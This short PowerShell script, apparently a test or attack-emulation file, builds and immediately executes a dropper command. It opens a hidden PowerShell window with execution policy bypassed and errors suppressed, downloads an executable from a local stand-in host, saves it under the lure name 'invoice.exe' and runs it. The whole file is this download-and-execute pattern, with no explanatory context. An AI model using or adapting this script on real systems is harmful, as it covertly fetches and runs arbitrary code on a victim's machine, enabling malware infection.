$path = "$PSScriptRoot\test_output\invoice.exe"
$cmd = "& powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', '$path');Start-Process $path"
write-host $cmd
Invoke-Expression -Command:$cmd
